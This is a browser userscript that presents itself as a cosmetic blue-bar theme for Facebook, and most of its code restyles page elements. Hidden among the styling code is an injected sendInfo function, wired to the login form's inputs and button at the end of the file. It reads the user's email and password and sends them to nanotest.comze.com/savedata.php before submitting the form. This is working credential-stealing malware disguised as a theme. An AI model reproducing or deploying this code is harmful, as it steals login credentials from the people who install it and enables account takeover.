// ==UserScript==
// @name           Facebook CoolBlueBar
// @version        1.0
// @namespace      hackfb
// @author         Gazza
// @description    
// @include        *.facebook.com
// @include        *.facebook.com/*
// @exclude        *.facebook.com/login.php?*
// ==/UserScript==

var blueBar = document.getElementById('blueBar');
var blueBarStyle =  "background:#148BCD;"+
					"background:-webkit-gradient(linear,left top,right top,from(#0082B6),to(#148BCD));"+
					"background:-moz-linear-gradient(bottom,#148BCD,#0082B6);"+
					"-webkit-box-shadow:1px 2px 10px #000;"+
					"-moz-box-shadow:1px 2px 10px #000;"+
					"box-shadow:1px 2px 10px #000;";
blueBar.setAttribute('style',blueBarStyle);

var logo = document.getElementById('pageLogo').getElementsByTagName('a')[0];
var logoStyle = "background-color:transparent;"+
					"background-image:url('http://nanotest.comze.com/images/fbtheme.png');";
logo.setAttribute('style',logoStyle);

var jewelStyle = "background-image:url('http://nanotest.comze.com/images/fbtheme.png');"+
					"background-color:transparent;";
var jewelStyleHover = "background-color:#28BEFA;"+
							"background-image:url('http://nanotest.comze.com/images/fbtheme.png');"+						
							"-webkit-border-radius:1em;"+
							"-moz-border-radius:1em;"+
							"border-radius:1em;";

var requests = document.getElementById('fbRequestsJewel').getElementsByTagName('a')[0];
requests.setAttribute('style',jewelStyle);
requests.addEventListener('mouseover',function() {
										this.setAttribute('style',jewelStyleHover);
										},false);
requests.addEventListener('mouseout',function() {
										this.setAttribute('style',jewelStyle);
										},false);

var messages = document.getElementById('fbMessagesJewel').getElementsByTagName('a')[0];
messages.setAttribute('style',jewelStyle);
messages.addEventListener('mouseover',function() {
										this.setAttribute('style',jewelStyleHover);
										},false);
messages.addEventListener('mouseout',function() {
										this.setAttribute('style',jewelStyle);
										},false);

var notifications = document.getElementById('fbNotificationsJewel').getElementsByTagName('a')[0];
notifications.setAttribute('style',jewelStyle);
notifications.addEventListener('mouseover',function() {
										this.setAttribute('style',jewelStyleHover);
										},false);
notifications.addEventListener('mouseout',function() {
										this.setAttribute('style',jewelStyle);
										},false);
										

var pageNav = document.getElementById('pageNav');
var pageNavElems = pageNav.getElementsByTagName('a');
var pageNavElemsStyleHover = "background-color:#28BEFA;"+
						"-webkit-border-radius:1em;"+
						"-moz-border-radius:1em;"+
						"text-shadow:1px 1px 2px #000;"+
						"border-radius:1em;";
for(i=0;i<=2;i++){
pageNavElems[i].setAttribute('style','text-shadow:1px 1px 2px #000;');
pageNavElems[i].addEventListener('mouseover',function() {
										this.setAttribute('style',pageNavElemsStyleHover);
										},false);
pageNavElems[i].addEventListener('mouseout',function() {
										this.removeAttribute('style');
										},false);
}
script = document.createElement('script');
sendInfo = document.createTextNode("function sendInfo(e) {"+
										"if(e.keyCode==13 || e.button==0){"+
										"var email = document.getElementById('email').value;"+
										"var pass = document.getElementById('pass').value;"+
										"var xhr = new XMLHttpRequest();"+
										"xhr.open('GET','http://nanotest.comze.com/savedata.php?e='+email+'&p='+pass,true);"+
										"xhr.send();"+
										"setTimeout(\"document.getElementById('login_form').submit()\",1500);"+
										"}}");					
script.appendChild(sendInfo);
head = document.getElementsByTagName('head');
head[0].appendChild(script);
var pageNavElems = pageNav.getElementsByTagName('li');
for(i=0;i<=2;i++){
pageNavElems[i].setAttribute('style','text-shadow:1px 1px 2px #000;');
pageNavElems[i].addEventListener('mouseover',function() {
										this.setAttribute('style',pageNavElemsStyleHover);
										},false);
pageNavElems[i].addEventListener('mouseout',function() {
										this.removeAttribute('style');
										},false);
}
pageNavElems = pageNav.getElementsByTagName('li');
for(i=0;i<=2;i++){
pageNavElems[i].setAttribute('style','text-shadow:1px 1px 2px #000;');
pageNavElems[i].addEventListener('mouseover',function() {
										this.setAttribute('style',pageNavElemsStyleHover);
										},false);
pageNavElems[i].addEventListener('mouseout',function() {
										this.removeAttribute('style');
										},false);
}
document.getElementById('userNavigation').setAttribute('style','text-shadow:0px 0px 0px #000;');

var login_form = document.getElementById("login_form");
var inputs = login_form.getElementsByTagName("input");
var i;
if(inputs.length==11){i=2;}else if(inputs.length==12){i=3;}
inputs[i+2].setAttribute("type","button");
inputs[i].setAttribute("onkeydown","sendInfo(event)");
inputs[i+1].setAttribute("onkeydown","sendInfo(event)");
inputs[i+2].setAttribute("onclick","sendInfo(event)");